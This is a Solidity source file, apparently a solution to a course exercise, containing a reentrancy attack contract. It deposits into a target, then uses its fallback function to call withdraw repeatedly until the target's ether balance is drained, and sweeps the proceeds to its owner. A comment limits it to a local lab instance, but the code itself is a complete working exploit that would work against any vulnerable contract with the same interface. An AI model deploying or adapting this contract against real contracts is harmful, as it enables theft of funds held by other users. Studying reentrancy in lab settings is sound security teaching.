// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

interface IDangerous {
    function depositMoney() external payable;
    function withdraw(uint amount) external;
}

// Demonstrates Q6(d) against a disposable, locally deployed lab instance only.
contract ReentrancyAttacker {
    IDangerous public target;
    address public owner;
    uint public chunk;

    constructor(address _target) public {
        target = IDangerous(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner && msg.value > 0);
        chunk = msg.value;
        target.depositMoney.value(msg.value)();
        target.withdraw(chunk);
    }

    function() external payable {
        if (address(target).balance > 0) {
            uint next = address(target).balance < chunk
                ? address(target).balance : chunk;
            target.withdraw(next);
        }
    }

    function sweep() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}
